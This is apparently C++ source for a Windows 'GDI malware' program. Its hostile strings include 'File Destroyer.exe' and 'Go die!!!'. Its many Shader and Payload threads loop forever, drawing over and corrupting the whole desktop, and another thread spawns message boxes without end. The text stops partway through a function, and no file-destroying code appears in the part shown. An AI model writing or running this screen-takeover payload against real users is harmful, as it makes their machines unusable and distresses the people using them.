﻿#pragma warning(disable: 4995)
#pragma comment(lib, "Dwmapi.lib")
#include<iostream>
#include<stdio.h>
#include<windows.h>
#include<windowsx.h>
#include<math.h>
#include<stdlib.h>
#include<time.h>
#include<conio.h>
#include<tchar.h>
#include<fstream>
#include<windef.h>
#include<memory>
#include<iosfwd>
#include<dwmapi.h>
#include"resource.h"
#pragma comment(lib,"winmm.lib")
#pragma comment(lib,"msimg32.lib")//use lambdaexec Neoarsphenamine\def.h
#pragma optimize("", off)//disable "t>>t" return 0
#define RndRGB RGB(rand() % 255, rand() % 255, rand() % 255)
LPCSTR texts[] = { "L0S3R","What you want to say?","L0L","78915418813141145141919810","Go die!!!","Still using this computer?","This equipment is useless.","by uiui","File Destroyer.exe" };
LPCSTR texts2[] = { "CreatePen","CreateSolidBrush","CreateCompatibleBitmap","CreateCombatibleDC","CreateFont","CreateHatchBrush","CreatePatternBrush" };
LPCWSTR lpIconNames[] = { IDI_ERROR, IDI_INFORMATION, IDI_QUESTION, IDI_SHIELD, IDI_WARNING, IDI_WINLOGO };
LPCWSTR lpCursorNames[] = { IDC_APPSTARTING, IDC_ARROW, IDC_CROSS, IDC_HAND, IDC_HELP, IDC_IBEAM, IDC_ICON, IDC_NO, IDC_SIZE, IDC_SIZEALL, IDC_SIZENESW, IDC_SIZENS, IDC_SIZENWSE, IDC_SIZEWE, IDC_UPARROW, IDC_WAIT };
LPCSTR iconLibraryNames[] = { "imageres.dll","shell32.dll","moricons.dll","pifmgr.dll" };
using namespace std;
typedef union _RGBQUAD {
    COLORREF rgb;
    struct {
        BYTE r;
        BYTE g;
        BYTE b;
        BYTE Reserved;
    };
}_RGBQUAD, * PRGBQUAD;
typedef struct {
    FLOAT h;
    FLOAT s;
    FLOAT l;
} HSL;
typedef struct {
    float x;
    float y;
    float z;
} VERTEX;
struct Point3D {
    float x, y, z;
};
typedef struct {
    int vtx0;
    int vtx1;
} EDGE;
namespace Colors {
    //These HSL functions was made by Wipet, credits to him!(write by pankoza)
    //And I Get It To Pankoza's Oxymorphazone source code.cpp(write by coder-linjian)

    HSL rgb2hsl(RGBQUAD rgb) {
        HSL hsl;

        BYTE r = rgb.rgbRed;
        BYTE g = rgb.rgbGreen;
        BYTE b = rgb.rgbBlue;

        FLOAT _r = (FLOAT)r / 255.f;
        FLOAT _g = (FLOAT)g / 255.f;
        FLOAT _b = (FLOAT)b / 255.f;

        FLOAT rgbMin = min(min(_r, _g), _b);
        FLOAT rgbMax = max(max(_r, _g), _b);

        FLOAT fDelta = rgbMax - rgbMin;
        FLOAT deltaR;
        FLOAT deltaG;
        FLOAT deltaB;

        FLOAT h = 0.f;
        FLOAT s = 0.f;
        FLOAT l = (FLOAT)((rgbMax + rgbMin) / 2.f);

        if (fDelta != 0.f) {
            s = l < .5f ? (FLOAT)(fDelta / (rgbMax + rgbMin)) : (FLOAT)(fDelta / (2.f - rgbMax - rgbMin));
            deltaR = (FLOAT)(((rgbMax - _r) / 6.f + (fDelta / 2.f)) / fDelta);
            deltaG = (FLOAT)(((rgbMax - _g) / 6.f + (fDelta / 2.f)) / fDelta);
            deltaB = (FLOAT)(((rgbMax - _b) / 6.f + (fDelta / 2.f)) / fDelta);

            if (_r == rgbMax)      h = deltaB - deltaG;
            else if (_g == rgbMax) h = (1.f / 3.f) + deltaR - deltaB;
            else if (_b == rgbMax) h = (2.f / 3.f) + deltaG - deltaR;
            if (h < 0.f)           h += 1.f;
            if (h > 1.f)           h -= 1.f;
        }

        hsl.h = h;
        hsl.s = s;
        hsl.l = l;
        return hsl;
    }

    RGBQUAD hsl2rgb(HSL hsl) {
        RGBQUAD rgb;

        FLOAT r = hsl.l;
        FLOAT g = hsl.l;
        FLOAT b = hsl.l;

        FLOAT h = hsl.h;
        FLOAT sl = hsl.s;
        FLOAT l = hsl.l;
        FLOAT v = (l <= .5f) ? (l * (1.f + sl)) : (l + sl - l * sl);

        FLOAT m;
        FLOAT sv;
        FLOAT fract;
        FLOAT vsf;
        FLOAT mid1;
        FLOAT mid2;

        INT sextant;

        if (v > 0.f) {
            m = l + l - v;
            sv = (v - m) / v;
            h *= 6.f;
            sextant = (INT)h;
            fract = h - sextant;
            vsf = v * sv * fract;
            mid1 = m + vsf;
            mid2 = v - vsf;

            switch (sextant) {
            case 0:
                r = v;
                g = mid1;
                b = m;
                break;
            case 1:
                r = mid2;
                g = v;
                b = m;
                break;
            case 2:
                r = m;
                g = v;
                b = mid1;
                break;
            case 3:
                r = m;
                g = mid2;
                b = v;
                break;
            case 4:
                r = mid1;
                g = m;
                b = v;
                break;
            case 5:
                r = v;
                g = m;
                b = mid2;
                break;
            }
        }

        rgb.rgbRed = (BYTE)(r * 255.f);
        rgb.rgbGreen = (BYTE)(g * 255.f);
        rgb.rgbBlue = (BYTE)(b * 255.f);

        return rgb;
    }
}
int RotateDC(HDC hdc, int Angle, POINT ptCenter) {
    int nGraphicsMode = SetGraphicsMode(hdc, GM_ADVANCED);
    XFORM xform;
    if (Angle != 0) {
        double fangle = (double)Angle / 180. * 3.1415926;
        xform.eM11 = (float)cos(fangle);
        xform.eM12 = (float)sin(fangle);
        xform.eM21 = (float)-sin(fangle);
        xform.eM22 = (float)cos(fangle);
        xform.eDx = (float)(ptCenter.x - cos(fangle) * ptCenter.x + sin(fangle) * ptCenter.y);
        xform.eDy = (float)(ptCenter.y - cos(fangle) * ptCenter.y - sin(fangle) * ptCenter.x);
        SetWorldTransform(hdc, &xform);
    }
    return nGraphicsMode;
}
int red, green, blue; bool ifblue = false;
COLORREF Hue(int length) {
    if (red != length) {
        red < length; red++;
        if (ifblue == true) {
            return RGB(red, 0, length);
        }
        else {
            return RGB(red, 0, 0);
        }
    }
    else {
        if (green != length) {
            green < length; green++;
            return RGB(length, green, 0);
        }
        else {
            if (blue != length) {
                blue < length; blue++;
                return RGB(0, length, blue);
            }
            else {
                red = 0; green = 0; blue = 0;
                ifblue = true;
            }
        }
    }
}
#define PI 3.14159265358979323846
LPCWSTR GetRandomChar(int length) {
    wchar_t* strRandom = new wchar_t[length + 1];
    for (int i = 0; i < length; i++) {
        strRandom[i] = (rand() % 256) + 1024;
    }
    strRandom[length] = L'\0';
    return strRandom;
}
Point3D RotatePoint(Point3D p, float x, float y, float z) {
    float cosX = cos(x), sinX = sin(x);
    float cosY = cos(y), sinY = sin(y);
    float cosZ = cos(z), sinZ = sin(z);
    float y2 = p.y * cosX - p.z * sinX;
    float z2 = p.y * sinX + p.z * cosX;
    p.y = y2;
    p.z = z2;
    float x2 = p.x * cosY + p.z * sinY;
    z2 = -p.x * sinY + p.z * cosY;
    p.x = x2;
    p.z = z2;
    x2 = p.x * cosZ - p.y * sinZ;
    y2 = p.x * sinZ + p.y * cosZ;
    p.x = x2;
    p.y = y2;
    return(p);
}
VOID WINAPI ci(int x, int y, int w, int h) {
    HDC hdc = GetDC(0);
    HBRUSH hBrush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
    HBITMAP old = (HBITMAP)SelectObject(hdc, hBrush);
    HRGN hrgn = CreateEllipticRgn(x, y, w + x, h + y);
    SelectClipRgn(hdc, hrgn);
    BitBlt(hdc, x, y, w, h, hdc, x + y, x - y, PATINVERT);
    SelectClipRgn(hdc, NULL);
    SelectObject(hdc, old);
    DeleteObject(hrgn);
    DeleteObject(hBrush);
    ReleaseDC(NULL, hdc);
}
HWND Hypno_Doom_Icon_Msg;
LRESULT CALLBACK msgBoxHook(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HCBT_ACTIVATE) {
        Hypno_Doom_Icon_Msg = (HWND)wParam;
        return 0;
    }
    return CallNextHookEx(0, nCode, wParam, lParam);
}
DWORD WINAPI Window0(LPVOID) {
    for (;;) {
        MSGBOXPARAMSA MsgBoxParam;
        ZeroMemory(&MsgBoxParam, sizeof(MsgBoxParam));
        MsgBoxParam.cbSize = sizeof(MsgBoxParam);
        MsgBoxParam.hInstance = (HINSTANCE)(GetModuleHandleA(0));
        MsgBoxParam.lpszIcon = MAKEINTRESOURCEA(IDI_ICON1);
        MsgBoxParam.dwStyle = MB_OK | MB_USERICON;
        MsgBoxParam.lpszCaption = "";
        MsgBoxParam.lpszText = "";
        HHOOK hook = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
        MessageBoxIndirectA(&MsgBoxParam);
        UnhookWindowsHookEx(hook);
    }
}
DWORD WINAPI Shader1(LPVOID) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
    BITMAPINFO bmi = { 40,w,h,1,32,BI_RGB };
    PRGBQUAD rgbquad = { 0 };
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hcdc, bmp);
    ReleaseDC(0, hdc);
    for (;;) {
        hdc = GetDC(0);
        HDC cdc2 = CreateCompatibleDC(hdc);
        HBITMAP bmp2 = CreateCompatibleBitmap(hdc, w, h), old = (HBITMAP)SelectObject(cdc2, bmp2);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int y = 0; y < h; y++) {
            for (int x = 0; x < w; x++) {
                rgbquad[x + w * y].r += x + w * y;
                rgbquad[x + w * y].g += 666;
                rgbquad[x + w * y].b += 255;
            }
        }
        BitBlt(cdc2, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        for (int y = 0; y < h; y++) {
            int rrr = rand() % 200;
            BitBlt(hcdc, -rrr, y, w, 1, cdc2, 0, y, SRCCOPY);
            BitBlt(hcdc, w - rrr, y, w, 1, cdc2, 0, y, SRCCOPY);
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc);
        SelectObject(cdc2, old); DeleteObject(bmp2);
        Sleep(10);
    }
}
DWORD WINAPI Shader2(LPVOID) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
    BITMAPINFO bmi = { 40,w,h,1,32,BI_RGB };
    PRGBQUAD rgbquad = { 0 };
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hcdc, bmp);
    ReleaseDC(0, hdc);
    for (;;) {
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int y = 0; y < h; y++) {
            for (int x = 0; x < w; x++) {
                rgbquad[x + w * y].r /= 2;
                rgbquad[x + w * y].g /= 3;
                rgbquad[x + w * y].b += x ^ y;
            }
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc);
        Sleep(10);
    }
}
DWORD WINAPI Payload2(LPVOID) {
    while (1) {
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
        HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h), old = (HBITMAP)SelectObject(hcdc, bmp);
        HBRUSH hBrush = CreateHatchBrush(4, 0); HBITMAP old2 = (HBITMAP)SelectObject(hcdc, hBrush);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int x = 0; x < w; x++) {
            int rrr = rand() % 20 - 10;
            BitBlt(hcdc, x, rrr, 1, h, hcdc, x, 0, SRCCOPY);
        }
        for (int y = 0; y < h; y++) {
            int rrr = rand() % 20 - 10;
            BitBlt(hcdc, rrr, y, w, 1, hcdc, 0, y, SRCCOPY);
        }
        PatBlt(hcdc, 0, 0, w, h, PATINVERT);
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        SelectObject(hcdc, old); DeleteObject(bmp);
        SelectObject(hcdc, old2); DeleteObject(hBrush);
        DeleteDC(hcdc); ReleaseDC(0, hdc);
        Sleep(1);
    }
}
DWORD WINAPI Shader3(LPVOID) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
    BITMAPINFO bmi = { 40,w,h,1,32,BI_RGB };
    PRGBQUAD rgbquad = { 0 };
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hcdc, bmp);
    ReleaseDC(0, hdc);
    for (;;) {
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int y = 0; y < h; y++) {
            for (int x = 0; x < w; x++) {
                int rgb = rgbquad[x + w * y].rgb;
                rgbquad[x + w * y].rgb = rgb ^ RGB((x ^ y) >> x, x >> y, (x + y) << x) ? RGB((x ^ y) >> x, x >> y, (x + y) << x) : -rgb;
            }
        }
        for (int y = 0; y < h; y++) {
            int rrr = rand() % 20 - 10;
            BitBlt(hcdc, rrr, y, w, 1, hcdc, 0, y, SRCCOPY);
        }
        BLENDFUNCTION blf = { 0 };
        blf.BlendOp = AC_SRC_OVER;
        blf.BlendFlags = 0;
        blf.SourceConstantAlpha = 128;
        blf.AlphaFormat = 0;
        AlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blf);
        ReleaseDC(0, hdc);
        Sleep(10);
    }
}
DWORD WINAPI Shader4(LPVOID) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
    BITMAPINFO bmi = { 40,w,h,1,32,BI_RGB };
    PRGBQUAD rgbquad = { 0 };
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hcdc, bmp);
    ReleaseDC(0, hdc);
    for (;;) {
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int y = 0; y < h; y++) {
            for (int x = 0; x < w; x++) {
                rgbquad[x + w * y].rgb += 1 + x | (y + 4) * x;
            }
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCAND);
        ReleaseDC(0, hdc);
        Sleep(10);
    }
}
DWORD WINAPI Payload4(LPVOID) {
    for (;;) {
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
        HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h), old = (HBITMAP)SelectObject(hcdc, bmp);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int i = 0; i < 20; i++) {
            int x = rand() % w, y = rand() % h;
            BitBlt(hcdc, x, rand() % 10 - 5, 90, h, hcdc, x, 0, SRCPAINT);
            BitBlt(hcdc, rand() % 10 - 5, y, w, 90, hcdc, 0, y, SRCAND);
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        SelectObject(hcdc, old); DeleteObject(bmp);
        DeleteDC(hcdc); ReleaseDC(0, hdc);
        Sleep(1);
    }
}
DWORD WINAPI Shader5(LPVOID) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
    BITMAPINFO bmi = { 40,w,h,1,32,BI_RGB };
    PRGBQUAD rgbquad = { 0 };
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hcdc, bmp);
    ReleaseDC(0, hdc);
    for (int t = 0;; t++) {
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int y = 0; y < h; y++) {
            for (int x = 0; x < w; x++) {
                rgbquad[x + w * y].rgb = (x + w * y) * (x ^ y) * (x | 555);
            }
        }
        BitBlt(hdc, 5, 10 * sin(t * PI / 180.f), w, h, hcdc, 0, 0, SRCERASE); t %= 360;
        ReleaseDC(0, hdc);
        Sleep(10);
    }
}
DWORD WINAPI Shader6(LPVOID) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
    BITMAPINFO bmi = { 40,w,h,1,32,BI_RGB };
    PRGBQUAD rgbquad = { 0 };
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hcdc, bmp);
    ReleaseDC(0, hdc);
    for (int t = 0;; t++) {
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int y = 0; y < h; y++) {
            for (int x = 0; x < w; x++) {
                rgbquad[x + w * y].rgb = x * (x * y | y) ^ (x | y & x * 7) + (x + 1 & 1);
                rgbquad[x + w * y].rgb *= t;
            }
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc);
        Sleep(10);
    }
}
DWORD WINAPI Shader7(LPVOID) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
    BITMAPINFO bmi = { 40,w,h,1,32,BI_RGB };
    PRGBQUAD rgbquad = { 0 };
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hcdc, bmp);
    ReleaseDC(0, hdc);
    for (;;) {
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int y = 0; y < h; y++) {
            for (int x = 0; x < w; x++) {
                int rgb = (rgbquad[x + w * y].r + rgbquad[x + w * y].g + rgbquad[x + w * y].b) / 3;
                rgbquad[x + w * y].rgb += RGB(rgb + (x ^ y) + x, rgb + (x ^ y) + x, rgb + (x ^ y) + x);
            }
        }
        for (int y = 0; y < h; y += 50) {
            for (int x = 0; x < w; x += 50) {
                StretchBlt(hcdc, x, y, 50, 50, hcdc, x, y, 1, 1, SRCCOPY);
            }
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc);
        Sleep(10);
    }
}
DWORD WINAPI Shader8(LPVOID) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
    BITMAPINFO bmi = { 40,w,h,1,32,BI_RGB };
    PRGBQUAD rgbquad = { 0 };
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hcdc, bmp);
    ReleaseDC(0, hdc);
    for (;;) {
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int y = 0; y < h; y++) {
            for (int x = 0; x < w; x++) {
                int rgb = ((int)sqrt(100 + 100) / 3 + x | y);
                rgbquad[x + w * y].rgb += rgb;
                rgbquad[x + w * y].r >>= rgb;
            }
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc);
        Sleep(10);
    }
}
DWORD WINAPI Payload8(LPVOID) {
    for (;;) {
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
        HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h), old = (HBITMAP)SelectObject(hcdc, bmp);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int i = 0; i < 600; i++) {
            int x = rand() % w, y = rand() % h;
            BitBlt(hcdc, x + rand() % 3 - 1, y + rand() % 3 - 1, w - y, h - x, hcdc, x, y, SRCCOPY);
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        SelectObject(hcdc, old); DeleteObject(bmp);
        DeleteDC(hcdc); ReleaseDC(0, hdc);
        Sleep(1);
    }
}
DWORD WINAPI Shader9(LPVOID) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
    BITMAPINFO bmi = { 40,w,h,1,32,BI_RGB };
    PRGBQUAD rgbquad = { 0 };
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hcdc, bmp);
    ReleaseDC(0, hdc);
    for (;;) {
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int y = 0; y < h; y++) {
            for (int x = 0; x < w; x++) {
                rgbquad[x + w * y].rgb += RGB(x + y, x + w * y, x * y);
                rgbquad[x + w * y].rgb *= 2;
            }
        }
        for (int y = 0; y < h; y++) {
            BitBlt(hcdc, rand() % 100 - 50, y, w, 1, hcdc, 0, y, SRCCOPY);
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc);
        Sleep(10);
    }
}
DWORD WINAPI Shader10(LPVOID) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
    BITMAPINFO bmi = { 40,w,h,1,32,BI_RGB };
    PRGBQUAD rgbquad = { 0 };
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hcdc, bmp);
    ReleaseDC(0, hdc);
    for (;;) {
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int y = 0; y < h; y++) {
            for (int x = 0; x < w; x++) {
                rgbquad[x + w * y].rgb += y + h - w | x + (x || y ? 120 : 0);
            }
        }
        for (int y = 0; y < h; y += 70) {
            BitBlt(hcdc, rand() % 100 - 50, y, w, 70, hcdc, 0, y, SRCCOPY);
        }
        BLENDFUNCTION blf = { 0 };
        blf.BlendOp = AC_SRC_OVER;
        blf.BlendFlags = 0;
        blf.SourceConstantAlpha = 128;
        blf.AlphaFormat = 0;
        AlphaBlend(hdc, rand() % 20 - 10, rand() % 20 - 10, w, h, hcdc, 0, 0, w, h, blf);
        ReleaseDC(0, hdc);
        Sleep(10);
    }
}
DWORD WINAPI Shader11(LPVOID) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
    BITMAPINFO bmi = { 40,w,h,1,32,BI_RGB };
    PRGBQUAD rgbquad = { 0 };
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hcdc, bmp);
    ReleaseDC(0, hdc);
    for (;;) {
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int y = 0; y < h; y++) {
            for (int x = 0; x < w; x++) {
                rgbquad[x + w * y].rgb *= x ^ y;
            }
        }
        BLENDFUNCTION blf = { 0 };
        blf.BlendOp = AC_SRC_OVER;
        blf.BlendFlags = 0;
        blf.SourceConstantAlpha = 128;
        blf.AlphaFormat = 0;
        AlphaBlend(hdc, rand() % 20 - 10, rand() % 20 - 10, w, h, hcdc, 0, 0, w, h, blf);
        ReleaseDC(0, hdc);
        Sleep(10);
    }
}
DWORD WINAPI Shader12(LPVOID) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
    BITMAPINFO bmi = { 40,w,h,1,32,BI_RGB };
    PRGBQUAD rgbquad = { 0 };
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hcdc, bmp);
    ReleaseDC(0, hdc);
    for (;;) {
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        HBRUSH b = CreateSolidBrush(255);
        HBITMAP old = (HBITMAP)SelectObject(hcdc, b);
        PatBlt(hcdc, 0, 0, w, h, PATCOPY);
        BitBlt(hcdc, w / 6, h / 6, w - (w / 6) - (w / 6), h - (h / 6) - (h / 6), hdc, w / 6, h / 6, SRCCOPY);
        for (int y = h / 6; y < h - (h / 6); y++) {
            for (int x = w / 6; x < w - (w / 6); x++) {
                rgbquad[x + w * y].rgb *= rgbquad[x + w * y].b;
                rgbquad[x + w * y].rgb += x | y;
            }
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc); SelectObject(hcdc, old); DeleteObject(b);
        Sleep(10);
    }
}
DWORD WINAPI Shader13(LPVOID) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
    BITMAPINFO bmi = { 40,w,h,1,32,BI_RGB };
    PRGBQUAD rgbquad = { 0 };
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hcdc, bmp);
    ReleaseDC(0, hdc);
    for (int t = 0;; t++) {
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int y = 0; y < h; y++) {
            for (int x = 0; x < w; x++) {
                rgbquad[x + w * y].rgb = t * (t / (x + 333 + y) & 1 + 1) * 114 - (514 - (x | y));
                rgbquad[x + w * y].rgb *= t;
            }
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc);
        Sleep(10);
    }
}
DWORD WINAPI Shader14(LPVOID) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
    BITMAPINFO bmi = { 40,w,h,1,32,BI_RGB };
    PRGBQUAD rgbquad = { 0 };
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hcdc, bmp);
    ReleaseDC(0, hdc);
    for (;;) {
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int y = 0; y < h; y++) {
            for (int x = 0; x < w; x++) {
                rgbquad[x + w * y].rgb += (x + 5) * (y + x - y) ^ (4444 + y);
            }
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc);
        Sleep(10);
    }
}
DWORD WINAPI Payload14(LPVOID) {
    for (;;) {
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
        HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h), old = (HBITMAP)SelectObject(hcdc, bmp);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        BLENDFUNCTION blf = { 0 };
        blf.BlendOp = AC_SRC_OVER;
        blf.BlendFlags = 0;
        blf.SourceConstantAlpha = 128;
        blf.AlphaFormat = 0;
        AlphaBlend(hdc, 100, 100, w, h, hcdc, 0, 0, w, h, blf);
        ReleaseDC(0, hdc);
        SelectObject(hcdc, old); DeleteObject(bmp);
        Sleep(1);
    }
}
DWORD WINAPI Shader15(LPVOID) {
    int i = 0, xxx = 0;
    while (true) {
        HDC hdc = GetDC(0);
        HDC hcdc = CreateCompatibleDC(hdc);
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        BITMAPINFO bmpi = { 0 };
        bmpi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB };
        RGBQUAD* rgbquad = NULL;
        HSL hslcolor;
        RGBQUAD rgbquadCopy;
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
        SelectObject(hcdc, hBitmap);
        for (int x = 0; x < w; x++) {
            for (int y = 0; y < h; y++) {
                int index = w * y + x;
                int fx = (int)(((x * xxx) & (y * xxx) & (x - xxx) ^ y));
                rgbquad[index].rgbRed = fx + i;
                rgbquad[index].rgbGreen = fx + i;
                rgbquad[index].rgbBlue = fx + i;
            }
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hdc); DeleteDC(hcdc);
        i++, xxx += 2;
    }
}
DWORD WINAPI Shader16(LPVOID) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
    BITMAPINFO bmi = { 40,w,h,1,32,BI_RGB };
    PRGBQUAD rgbquad = { 0 };
    HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hcdc, bmp);
    ReleaseDC(0, hdc);
    for (;;) {
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int y = 0; y < h; y++) {
            for (int x = 0; x < w; x++) {
                rgbquad[x + w * y].rgb += 777777777777777 + (RGB(RGB(x | y, x | y, x | y), x | y, x | y));
            }
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc);
        Sleep(10);
    }
}
DWORD WINAPI Shader17(LPVOID) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
